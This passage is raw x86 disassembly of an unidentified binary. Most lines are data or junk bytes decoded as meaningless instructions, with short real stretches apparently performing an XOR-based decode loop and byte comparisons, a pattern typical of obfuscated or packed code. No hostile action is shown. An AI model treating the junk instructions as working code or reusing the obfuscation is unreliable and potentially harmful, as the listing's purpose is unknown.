  404913:	xor    ah,BYTE PTR [edx+0x3a]
  404916:	in     eax,0x15
  404918:	mov    eax,0x9248572c
  40491d:	fild   DWORD PTR [esp+ebx*4-0x6cf3d2cb]
  404924:	adc    dl,BYTE PTR ds:0x36dbaa98
  40492a:	or     ebx,DWORD PTR [ecx+esi*1]
  40492d:	and    DWORD PTR [esi],ebx
  40492f:	stos   DWORD PTR es:[edi],eax
  404930:	jno    0x404903
  404932:	arpl   WORD PTR [edi+ecx*1+0x1d732c61],bp
  404939:	or     bh,BYTE PTR [edx-0x2f7e71d9]
  40493f:	scas   eax,DWORD PTR es:[edi]
  404940:	popf   
  404941:	push   edx
  404942:	mov    esi,0x6dcec591
  404947:	test   BYTE PTR [ebp-0x571c862b],dh
  40494d:	stos   BYTE PTR es:[edi],al
  40494e:	mov    ecx,0xd89161f2
  404953:	sub    DWORD PTR [eax+0x55],ebp
  404956:	mov    bh,0x83
  404958:	push   esi
  404959:	inc    eax
  40495a:	cmp    ah,bl
  40495c:	pushf  
  40495d:	test   eax,0x66054cba
  404963:	jne    0x4048f9
  404965:	xor    al,0x53
  404967:	popa   
  404968:	div    eax
  40496a:	push   edx
  40496b:	jl     0x404909
  40496d:	sbb    al,0xda
  40496f:	adc    ecx,edi
  404971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404972:	adc    al,0xc0
  404974:	sbb    eax,DWORD PTR [ecx+0x5e]
  404977:	out    0xbe,al
  404979:	fwait
  40497a:	cwde   
  40497b:	jnp    0x404910
  40497d:	fisub  DWORD PTR [esi+0x155755ba]
  404983:	imul   eax,DWORD PTR [esi],0x9672a7b2
  404989:	dec    ebx
  40498a:	sub    DWORD PTR [ecx+ecx*4-0x3d620206],eax
  404991:	push   esp
  404992:	out    0xb1,al
  404994:	cmp    DWORD PTR [ebx+0x23],ebx
  404997:	jle    0x4049f5
  404999:	inc    edi
  40499a:	out    dx,al
  40499b:	mov    dl,0x6f
  40499d:	push   edi
  40499e:	dec    esi
  40499f:	daa    
  4049a0:	fwait
  4049a1:	mov    esp,0x9e65bdce
  4049a6:	cmc    
  4049a7:	mov    ah,BYTE PTR [ebp+0x19]
  4049aa:	jnp    0x4049f3
  4049ac:	retf   
  4049ad:	jmp    0x260:0xcf252619
  4049b4:	cmp    ecx,DWORD PTR [ebx+esi*1+0x1c5b64de]
  4049bb:	add    eax,0x3879ffd3
  4049c0:	dec    esp
  4049c1:	mov    ebp,DWORD PTR [esi+esi*1-0x48]
  4049c5:	fnsave [edx-0x6a]
  4049c8:	push   ds
  4049c9:	mov    eax,0xa74e33d5
  4049ce:	jb     0x404a42
  4049d0:	xchg   ecx,eax
  4049d1:	out    dx,eax
  4049d2:	stc    
  4049d3:	fs jae 0x404a2e
  4049d6:	mul    DWORD PTR [ebx+0x54]
  4049d9:	hlt    
  4049da:	cmp    eax,0xc5a25ae8
  4049df:	push   edi
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43361b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4335b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433553
  404a04:	sbb    DWORD PTR ds:0x4335f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433623,0x4335f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433633,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx-0x26]
  404a70:	mov    edi,DWORD PTR [ebp-0xc]
  404a73:	test   BYTE PTR ds:0x7fab7c7c,ch
  404a79:	jl     0x404af7
  404a7b:	inc    edx
  404a7c:	bound  ebx,QWORD PTR [edi-0x1c]
  404a7f:	adc    al,0x1f
  404a81:	(bad)  
  404a83:	pop    ds
  404a84:	add    DWORD PTR [esi-0x723f2e36],esp
  404a8a:	sbb    eax,0x10a6cc6e
  404a8f:	xor    BYTE PTR ds:0x9877f97b,ah
  404a95:	dec    ebx
  404a96:	outs   dx,DWORD PTR ds:[esi]
  404a97:	imul   esp,DWORD PTR [edx],0x8eaae9cf
  404a9d:	mov    eax,0x20ab98ad
  404aa2:	ret    
  404aa3:	aas    
  404aa4:	(bad)  
  404aa6:	add    ebp,ebx
  404aa8:	push   cs
  404aa9:	adc    BYTE PTR [esi-0x15],ch
  404aac:	and    ah,BYTE PTR [esi]
  404aae:	sti    
  404aaf:	mov    eax,ds:0x9b7df070
  404ab4:	into   
  404ab5:	inc    edx
  404ab6:	xchg   ebx,eax
  404ab7:	fistp  WORD PTR [eax]
  404ab9:	dec    esp
  404aba:	popa   
  404abb:	or     al,0x14
  404abd:	ret    
  404abe:	dec    ebp
  404abf:	push   eax
  404ac0:	test   eax,0x9c648e07
  404ac5:	cdq    
  404ac6:	out    dx,al
  404ac7:	pop    edx
  404ac8:	mov    edx,0xbe67eafb
  404acd:	bound  esp,QWORD PTR [eax+0x30]
  404ad0:	ins    DWORD PTR es:[edi],dx
  404ad1:	icebp  
  404ad2:	je     0x404b4a
  404ad4:	ror    DWORD PTR [edx],1
  404ad6:	jno    0x404a7f
  404ad8:	pop    ecx
  404ad9:	(bad)  
  404ada:	(bad)  
  404adb:	std    
  404adc:	inc    ecx
  404add:	int    0xde
  404adf:	int3   
  404ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae1:	mov    eax,0xae671aba
  404ae6:	mov    dh,0xeb
  404ae8:	add    eax,DWORD PTR [ebp+0x4a60c0e2]
  404aee:	jge    0x404b5d
  404af0:	pop    ecx
  404af1:	and    BYTE PTR [edx+0x4874560e],ch
  404af7:	fist   DWORD PTR [eax+edx*4-0x1c]
  404afb:	into   
  404afc:	cwde   
  404afd:	mov    ?,WORD PTR [edi]
  404aff:	int3   
  404b00:	push   ss
  404b01:	int3   
  404b02:	xlat   BYTE PTR ds:[ebx]
  404b03:	test   dl,dh
  404b05:	cs jmp 0x404a9d
  404b08:	adc    BYTE PTR [eax+edx*8],cl
  404b0b:	add    bh,ch
  404b0d:	std    
  404b0e:	loop   0x404ab9
  404b10:	xor    bh,BYTE PTR [ebp-0x2915ad6e]
  404b16:	xchg   ebx,eax
  404b17:	outs   dx,DWORD PTR ds:[esi]
  404b18:	arpl   dx,di
  404b1a:	add    eax,0xe8c31e02
  404b1f:	adc    al,al
  404b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b22:	push   0x66
  404b24:	push   ss
  404b25:	test   BYTE PTR [edx-0x33b557d9],dl
  404b2b:	dec    ebp
  404b2c:	adc    al,0x59
  404b2e:	ins    BYTE PTR es:[edi],dx
  404b2f:	mov    ds:0xfc85648f,al
  404b34:	sbb    eax,edi
  404b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b37:	push   esi
  404b38:	or     BYTE PTR [edi],dh
  404b3a:	sub    esi,DWORD PTR [esi]
  404b3c:	cmp    DWORD PTR [edi],ebx
  404b3e:	aam    0xb
  404b40:	inc    ebp
  404b41:	push   edi
  404b42:	push   esp
  404b43:	push   0xcb100d26
  404b48:	rcl    esi,cl
  404b4a:	xchg   DWORD PTR [esi-0xd62c06c],ebp
  404b50:	dec    edi
  404b51:	jp     0x404b01
  404b53:	pop    edx
  404b54:	xor    BYTE PTR [esi+0x488cbea8],bl
  404b5a:	stos   DWORD PTR es:[edi],eax
  404b5b:	js     0x404b86
  404b5d:	imul   ebp,DWORD PTR [esi],0x20
  404b60:	cmp    BYTE PTR [edx+0x476b2ffe],al
  404b66:	int3   
  404b67:	mov    ch,0xed
  404b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b6a:	int3   
  404b6b:	out    dx,eax
  404b6c:	scas   al,BYTE PTR es:[edi]
  404b6d:	add    ch,BYTE PTR [ecx-0x71]
  404b70:	or     BYTE PTR [ebx+ecx*2+0x6f],dl
  404b74:	mov    esp,gs
  404b76:	in     al,dx
  404b77:	arpl   si,cx
  404b79:	or     eax,0x4790346a
  404b7e:	into   
  404b7f:	xchg   ebx,eax
  404b80:	sbb    al,0x61
  404b82:	imul   edi,DWORD PTR [ebp-0x1b],0xffffffa0
  404b86:	shl    bh,0xb5
  404b89:	inc    ecx
  404b8a:	test   DWORD PTR [eiz*1-0x5170902b],esp
  404b91:	or     BYTE PTR [esi+eax*1+0xe460edc],ch
  404b98:	test   ch,0x67
  404b9b:	push   0xe6487dc5
  404ba0:	aad    0x67
  404ba2:	and    ebx,DWORD PTR [eax-0x72]
  404ba5:	jb     0x404b2b
  404ba7:	sub    esi,eax
  404ba9:	adc    esp,edx
  404bab:	mov    edx,0xbc5c1cf1
  404bb0:	xor    BYTE PTR [ecx],al
  404bb2:	ror    BYTE PTR [ecx+edi*1+0x51],1
  404bb6:	pop    ds
  404bb7:	push   ebp
  404bb8:	repz ja 0x404bb4
  404bbb:	add    bh,bh
  404bbd:	mov    cl,0xc9
  404bbf:	inc    ebx
  404bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc1:	mov    DWORD PTR [eax+ecx*1+0x2b108bbf],edx
  404bc8:	js     0x404c2d
  404bca:	mov    esp,0x74b21510
  404bcf:	ror    DWORD PTR [ebp+0x752dcdba],0x67
  404bd6:	dec    edi
  404bd7:	mov    bl,0x47
  404bd9:	retf   0x2850
  404bdc:	mov    BYTE PTR [ebx-0x71],ch
  404bdf:	(bad)  
  404be0:	push   ds
  404be1:	push   esp
  404be2:	sbb    bh,dl
  404be4:	mov    ss,WORD PTR [esi+esi*4]
  404be7:	mov    edi,0x16c26672
  404bed:	std    
  404bee:	xor    esp,DWORD PTR [ebx+0x78]
  404bf1:	dec    ebx
  404bf2:	xor    BYTE PTR [eax-0x3b],0xfa
  404bf6:	or     dl,bh
  404bf8:	ins    DWORD PTR es:[edi],dx
  404bf9:	mov    edx,0xe21d9191
  404bfe:	jge    0x404c08
  404c00:	xchg   esp,eax
  404c01:	out    dx,al
  404c02:	sub    ch,BYTE PTR [ebp-0x384ef4ce]
  404c08:	mov    esi,0x26579e59
  404c0d:	jl     0x404bfd
  404c0f:	jmp    0x404b96
  404c11:	(bad)  
  404c12:	mov    edx,0xfd850de7
  404c17:	sahf   
  404c18:	or     al,BYTE PTR [edi-0x604fd92e]
  404c1e:	jmp    0x404c4f
  404c20:	in     eax,0xb9
  404c22:	push   esi
  404c23:	add    BYTE PTR [edx+ebx*1],al
  404c26:	and    eax,0xf0efad2d
  404c2b:	mov    al,0x65
  404c2d:	inc    ecx
  404c2e:	adc    dl,ch
  404c30:	xor    eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	sbb    eax,0x33289903
  404c62:	das    
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c17
  404c6a:	sub    ebp,DWORD PTR [esp+esi*8+0x54]
  404c6e:	push   esp
  404c6f:	(bad)  
  404c70:	not    BYTE PTR [ecx-0x22]
  404c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c74:	mov    WORD PTR [edx],ss
  404c76:	sbb    eax,0x30f64a4
  404c7b:	ja     0x404c8a
  404c7d:	push   0xffffff85
  404c7f:	sahf   
  404c80:	(bad)  
  404c81:	ins    BYTE PTR es:[edi],dx
  404c82:	shl    esi,cl
  404c84:	xchg   esp,eax
  404c85:	ret    0x22c8
  404c88:	cld    
  404c89:	pop    ebx
  404c8a:	(bad)  
  404c8d:	mov    bl,0xba
  404c8f:	shl    DWORD PTR [esi-0x40],cl
  404c92:	pop    edi
  404c93:	jnp    0x404c65
  404c95:	dec    ecx
  404c96:	and    BYTE PTR [edi-0x3a],0x89
  404c9a:	or     eax,0xa78c21e5
  404c9f:	mov    edx,0xd989a49e
  404ca4:	ret    
  404ca5:	pminub mm6,QWORD PTR ds:0x1eb15d6d
  404cac:	xchg   edx,eax
  404cad:	pushf  
  404cae:	(bad)  
  404caf:	jno    0x404d09
  404cb1:	cld    
  404cb2:	sar    esp,0x25
  404cb5:	pushfw 
  404cb7:	retf   
  404cb8:	neg    BYTE PTR [ebx+0x64b1781a]
  404cbe:	ss mov edi,0x62538d08
  404cc4:	sub    dl,cl
  404cc6:	jb     0x404cf2
  404cc8:	outs   dx,BYTE PTR ds:[esi]
  404cc9:	cmpxchg DWORD PTR [ebx-0xd],edi
  404ccd:	adc    al,0xa1
  404ccf:	dec    edi
  404cd0:	aaa    
  404cd1:	sbb    ebp,DWORD PTR [edi-0x57561836]
  404cd7:	ds nop
  404cd9:	cmp    al,al
  404cdb:	(bad)  
  404cdc:	mov    DWORD PTR [ecx+0x15],esi
  404cdf:	call   esp
  404ce1:	push   esi
  404ce2:	xor    esp,DWORD PTR [edi+0x5d157766]
  404ce8:	pusha  
  404ce9:	mov    ebx,0x591ae395
  404cee:	dec    esp
  404cef:	imul   BYTE PTR [ebx+0x28997e02]
  404cf5:	and    dh,dh
  404cf7:	(bad)  
  404cf8:	adc    bh,BYTE PTR [edi+0x36]
  404cfb:	xlat   BYTE PTR ds:[ebx]
  404cfc:	jbe    0x404ce2
  404cfe:	sbb    eax,0xeaf78ed3
  404d03:	and    bl,BYTE PTR ds:0x9f24d4c2
  404d09:	xor    BYTE PTR [ecx+0x2300fce8],ah
  404d0f:	xlat   BYTE PTR ds:[ebx]
  404d10:	jno    0x404d6e
  404d12:	in     al,0xc9
  404d14:	dec    edx
  404d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d17:	je     0x404d63
  404d19:	push   ebx
  404d1a:	imul   ebx,DWORD PTR [edi+0x1b],0x28c3c458
  404d21:	pop    eax
  404d22:	pop    edi
  404d23:	cdq    
  404d24:	pop    ss
  404d25:	clc    
  404d26:	mov    esi,0x45c64d97
  404d2b:	stos   DWORD PTR es:[edi],eax
  404d2c:	fstp   QWORD PTR [esi+0x31e6c98]
  404d32:	mov    ecx,0x721fad90
  404d37:	push   cs
  404d38:	es in  al,0x77
  404d3b:	xor    eax,0x140614f7
  404d40:	push   ebx
  404d41:	sbb    eax,0x7b42da50
  404d46:	retf   
  404d47:	mov    ds:0x15d846d1,eax
  404d4c:	and    eax,0x8290be9a
  404d51:	int3   
  404d52:	pop    eax
  404d53:	pop    ds
  404d54:	xor    eax,0x1d372523
  404d59:	pop    ecx
  404d5a:	cmp    dl,BYTE PTR [ecx]
  404d5c:	out    dx,al
  404d5d:	repnz cdq 
  404d5f:	inc    esi
  404d60:	outs   dx,BYTE PTR ds:[esi]
  404d61:	xchg   ebp,eax
  404d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d63:	mov    esp,0xdaec5265
  404d68:	sbb    eax,0xae48c047
  404d6d:	jmp    0x404d3a
  404d6f:	lock pop ds
  404d71:	push   esp
  404d72:	cdq    
  404d73:	pop    ebp
  404d74:	jle    0x404dc4
  404d76:	push   es
  404d77:	or     DWORD PTR [eax],0xc4609b9
  404d7d:	loopne 0x404d7d
  404d7f:	outs   dx,DWORD PTR ds:[esi]
  404d80:	cmp    edi,DWORD PTR [ecx-0x2b]
  404d83:	or     DWORD PTR [edx+0x23ba8ae2],esi
  404d89:	cwde   
  404d8a:	out    0x4d,eax
  404d8c:	or     eax,0x9b08e976
  404d91:	inc    ebx
  404d92:	out    dx,al
  404d93:	stc    
  404d94:	test   eax,0x791ccd3a
  404d99:	and    DWORD PTR [ecx+0x8],ecx
  404d9c:	inc    edx
  404d9d:	jmp    0x404dc6
  404d9f:	icebp  
  404da0:	jge    0x404de0
  404da2:	inc    edi
  404da3:	push   ecx
  404da4:	xchg   ebp,eax
  404da5:	push   cs
  404da6:	push   ebx
  404da7:	jmp    0x404dcb
  404da9:	aas    
  404daa:	mov    eax,0x3ab3519c
  404daf:	jne    0x404d60
  404db1:	stos   BYTE PTR es:[edi],al
  404db2:	jle    0x404dc1
  404db4:	push   ebx
  404db5:	std    
  404db6:	int    0x19
  404db8:	pushf  
  404db9:	inc    esp
  404dba:	pmulhuw mm2,QWORD PTR ss:[eax-0x4c92bddc]
  404dc2:	test   al,0x26
  404dc4:	fidiv  DWORD PTR [edi+eiz*2]
  404dc7:	shl    BYTE PTR [eax],0xd
  404dca:	into   
  404dcb:	js     0x404d9a
  404dcd:	loope  0x404dab
  404dcf:	xchg   esp,eax
  404dd0:	jne    0x404dad
  404dd2:	push   ecx
  404dd3:	jle    0x404e01
  404dd5:	and    dh,al
  404dd7:	mov    DWORD PTR [ebp-0x18],0xdace54e0
  404dde:	fsubr  QWORD PTR cs:[ebp+0x5720e630]
  404de5:	lds    esi,FWORD PTR [ecx]
  404de7:	into   
  404de8:	or     DWORD PTR [eax-0x1b304da9],0x103b5da8
  404df2:	pop    esi
  404df3:	sbb    BYTE PTR ds:0x8c50b78f,dh
  404df9:	sub    esi,DWORD PTR [edi+0x7bf18963]
  404dff:	cmp    bh,BYTE PTR [esi-0x49]
  404e02:	call   0x46c5c25d
  404e07:	inc    esp
  404e08:	pop    esp
  404e09:	ror    DWORD PTR [ebp+0x329437f9],1
  404e0f:	jo     0xd74a5c8c
  404e15:	push   eax
  404e16:	jb     0x404da7
  404e18:	leave  
  404e19:	or     DWORD PTR [eax+ebx*2-0x5],esp
  404e1d:	retf   
  404e1e:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404e22:	mov    edx,DWORD PTR [ebp+0xc]
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xfdac8663
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e38
  404e56:	nop
  404e57:	pop    esp
  404e58:	mov    bl,0xce
  404e5a:	cli    
  404e5b:	inc    esi
  404e5c:	retf   
  404e5d:	adc    al,0x25
  404e5f:	xor    ecx,DWORD PTR ds:0x33c97c1d
  404e65:	addr16 add esp,eax
  404e68:	repnz mul ah
  404e6b:	fnstenv [ebp+0xe8b8e81]
  404e71:	fld    DWORD PTR [esi+0x62]
  404e74:	ret    0x7477
  404e77:	fisub  WORD PTR ss:[ebx+eax*4]
  404e7b:	cwde   
  404e7c:	mov    edi,DWORD PTR [ecx+0x42e27070]
  404e82:	cmp    ch,ah
  404e84:	xchg   edi,eax
  404e85:	xor    eax,0xdbcdf78e
  404e8a:	retf   
  404e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e8c:	adc    eax,0x9eb5deb5
  404e91:	pop    esi
  404e92:	bound  edx,QWORD PTR [edi+0x56]
  404e95:	jmp    DWORD PTR [ebp-0x74]
  404e98:	sbb    eax,0x913779d4
  404e9d:	stos   DWORD PTR es:[edi],eax
  404e9e:	daa    
  404e9f:	sub    edi,DWORD PTR ds:0x1a0303ea
  404ea5:	test   ah,bh
  404ea7:	mov    al,ds:0x32d9252b
  404eac:	sub    eax,0x9cde1c51
  404eb1:	inc    eax
  404eb2:	ret    
  404eb3:	mov    eax,0x16e099da
  404eb8:	int    0x8a
  404eba:	mov    al,0x96
  404ebc:	xor    DWORD PTR [esi],ebx
  404ebe:	jo     0x404e42
  404ec0:	inc    esi
  404ec1:	int    0xf0
  404ec3:	test   eax,0xd3c9118c
  404ec8:	sub    BYTE PTR [ecx],ch
  404eca:	sub    eax,0x913bf3e7
  404ecf:	pushf  
  404ed0:	ja     0x404f48
  404ed2:	mov    BYTE PTR [ebx-0xa],bl
  404ed5:	mov    cl,0x3c
  404ed7:	mov    al,0xf9
  404ed9:	outs   dx,BYTE PTR ds:[esi]
  404eda:	lock in eax,dx
  404edc:	sbb    DWORD PTR [edi-0x12907c57],0xffffffd1
  404ee3:	cmp    eax,DWORD PTR [edi]
  404ee5:	(bad)  
  404ee6:	(bad)  
  404ee7:	scas   al,BYTE PTR es:[edi]
  404ee8:	push   0x2
  404eea:	icebp  
  404eeb:	in     eax,0x88
  404eed:	dec    edi
  404eee:	jl     0x404ec8
  404ef0:	pop    esp
  404ef1:	fidivr WORD PTR [edx]
  404ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef4:	or     DWORD PTR [ebp+0x68841c21],ebx
  404efa:	test   BYTE PTR [ecx+ebx*1+0x6e],al
  404efe:	call   0x27fcc13d
  404f03:	out    dx,eax
  404f04:	das    
  404f05:	mov    dh,0xe1
  404f07:	jmp    0x864b58b4
  404f0c:	fcomp  QWORD PTR [edx+0x46]
  404f0f:	pusha  
  404f10:	hlt    
  404f11:	sbb    bh,BYTE PTR [edi]
  404f13:	repnz mov ebx,0xa6594cda
  404f19:	pop    edi
  404f1a:	push   cs
  404f1b:	int3   
  404f1c:	data16 jp 0x404f46
  404f1f:	sahf   
  404f20:	gs mov bh,0xb5
  404f23:	iret   
  404f24:	mov    esi,0x630a7070
  404f29:	lods   al,BYTE PTR ds:[esi]
  404f2a:	loop   0x404f41
  404f2c:	fdivrp st(5),st
  404f2e:	cdq    
  404f2f:	(bad)  
  404f30:	ins    BYTE PTR es:[edi],dx
  404f31:	mov    ah,0x26
  404f33:	push   0x4d53eb5c
  404f38:	shl    DWORD PTR [esi+0x28],0x87
  404f3c:	nop
  404f3d:	imul   ebp,DWORD PTR [edx+edx*4-0x3bf0d054],0xe8945c13
  404f48:	inc    ecx
  404f49:	inc    esp
  404f4a:	(bad)  
  404f4b:	ds sub eax,0xfbfdf546
  404f51:	loopne 0x404f92
  404f53:	jmp    0x6349:0xcde7c7ef
  404f5a:	mov    ebx,fs
  404f5c:	stos   DWORD PTR es:[edi],eax
  404f5d:	rol    DWORD PTR [esi],cl
  404f5f:	mov    ch,0x10
  404f61:	(bad)  
  404f62:	adc    al,0x5d
  404f64:	aad    0x92
  404f66:	test   al,0x55
  404f68:	rcl    DWORD PTR [eax],0xf0
  404f6b:	shl    BYTE PTR [ebp+ecx*2-0x13],0x9f
  404f70:	outs   dx,BYTE PTR ds:[esi]
  404f71:	sub    al,0x5
  404f73:	not    DWORD PTR [edi]
  404f75:	outs   dx,BYTE PTR ds:[esi]
  404f76:	popf   
  404f77:	xor    BYTE PTR [esi],ah
  404f79:	jl     0x404f6e
  404f7b:	loopne 0x404fad
  404f7d:	sub    DWORD PTR [edx-0x3c628ba5],0xc169c8f4
  404f87:	xchg   edx,eax
  404f88:	push   0x9bda0064
  404f8d:	out    dx,eax
  404f8e:	sbb    DWORD PTR [esp+eiz*2],eax
  404f91:	es pushf 
  404f93:	adc    al,0xec
  404f95:	fs mov edi,0xb817b95d
  404f9b:	test   BYTE PTR [ebp+eiz*8-0x66241dbb],dh
  404fa2:	test   eax,0x65c3afde
  404fa7:	jnp    0x404f2f
  404fa9:	jo     0x405015
  404fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fac:	adc    eax,DWORD PTR [edi+edi*2+0x2c]
  404fb0:	push   ds
  404fb1:	add    esi,eax
  404fb3:	xor    BYTE PTR [esi],al
  404fb5:	pop    ecx
  404fb6:	mov    edi,0xda6e05b
  404fbb:	add    bh,BYTE PTR [edi+ecx*1-0x5a4c61a5]
  404fc2:	inc    ebx
  404fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fc4:	push   cs
  404fc5:	sti    
  404fc6:	test   BYTE PTR [ebp+0x2f],ch
  404fc9:	sub    cl,bh
  404fcb:	pop    ebx
  404fcc:	(bad)  
  404fcd:	xor    eax,0xb0f07e87
  404fd2:	jo     0x404fa6
  404fd4:	add    dl,BYTE PTR [ebx+esi*8-0x7ee904d4]
  404fdb:	xor    ecx,DWORD PTR [eax+0x14]
  404fde:	test   eax,0x2cbffa13
  404fe3:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404fe5:	fwait
  404fe6:	sub    bh,BYTE PTR [edi]
  404fe8:	sbb    DWORD PTR [ebp-0x1537a60c],ecx
  404fee:	pop    ss
  404fef:	scas   al,BYTE PTR es:[edi]
  404ff0:	dec    esp
  404ff1:	ins    DWORD PTR es:[edi],dx
  404ff2:	fstp   QWORD PTR [ebx+0x3a21eb78]
  404ff8:	and    DWORD PTR [edx-0x71],esi
  404ffb:	push   ecx
  404ffc:	clc    
  404ffd:	add    eax,0x9516d455
  405002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405003:	mov    al,0xd4
  405005:	in     eax,0x4
  405007:	js     0x40505d
  405009:	or     al,0x3
  40500b:	(bad)  
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	scas   al,BYTE PTR es:[edi]
  405044:	ja     0x404fcd
  405046:	adc    BYTE PTR [ebp-0x548383d8],ah
  40504c:	jg     0x4050ca
  40504e:	jl     0x405073
  405050:	out    0x78,al
  405052:	out    dx,al
  405053:	pop    es
  405054:	fidivr WORD PTR [ebp+0x2e46999b]
  40505a:	clc    
  40505b:	mov    ch,ch
  40505d:	mov    ecx,0x39a0572a
  405062:	arpl   WORD PTR [esi-0x5f],di
  405065:	jle    0x4050b7
  405067:	xchg   al,cl
  405069:	pop    ds
  40506a:	jl     0x4050d7
  40506c:	sbb    cl,cl
  40506e:	(bad)  
  40506f:	ret    0x3721
  405072:	sbb    eax,0xf6ee50
  405077:	int    0xc0
  405079:	jecxz  0x4050d0
  40507b:	enter  0x2502,0x34
  40507f:	inc    eax
  405080:	cmp    ch,ch
  405082:	dec    ebx
  405083:	in     al,0x83
  405085:	xchg   BYTE PTR [ebp+0x58],al
  405088:	mov    ah,0x37
  40508a:	adc    eax,0xc0015622
  40508f:	in     al,0x35
  405091:	aaa    
  405092:	xlat   BYTE PTR ds:[ebx]
  405093:	xchg   ecx,eax
  405094:	xchg   DWORD PTR [esi+0x7bb8873a],ebp
  40509a:	into   
  40509b:	scas   al,BYTE PTR es:[edi]
  40509c:	pop    es
  40509d:	mov    ecx,0x1462d685
  4050a2:	bound  esp,QWORD PTR [edx+0x8]
  4050a5:	sub    bl,BYTE PTR [edx]
  4050a7:	retf   
  4050a8:	and    al,0xfe
  4050aa:	dec    edx
  4050ab:	mov    bh,0x4b
  4050ad:	push   eax
  4050ae:	sbb    DWORD PTR [edx],edi
  4050b0:	push   0x9f4adfc0
  4050b5:	fisttp WORD PTR [eax-0x75]
  4050b8:	test   eax,0x9bc1bbd2
  4050bd:	mov    BYTE PTR [ecx],ch
  4050bf:	sub    cl,BYTE PTR ss:[esi+0x1b1bb1b0]
  4050c6:	sti    
  4050c7:	ds push ecx
  4050c9:	in     eax,0xd0
  4050cb:	rol    BYTE PTR [eax-0x5f],cl
  4050ce:	ins    BYTE PTR es:[edi],dx
  4050cf:	mov    ecx,0x35c596d5
  4050d4:	pop    esp
  4050d5:	int    0x97
  4050d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050d8:	aam    0x41
  4050da:	push   ds
  4050db:	lods   eax,DWORD PTR ds:[esi]
  4050dc:	adc    eax,0x7acf52aa
  4050e1:	jns    0x405149
